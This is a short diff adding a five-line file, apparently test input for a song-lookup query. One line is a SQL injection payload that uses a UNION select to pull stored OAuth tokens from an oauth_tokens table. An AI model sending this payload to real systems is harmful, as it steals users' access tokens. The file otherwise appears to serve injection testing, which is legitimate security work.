@@ -1,0 +1,5 @@
+1
+katom' or 1=1 UNION select oauth_token, 'test' as Test from oauth_tokens where '1'='1
+song_name
+4
+5
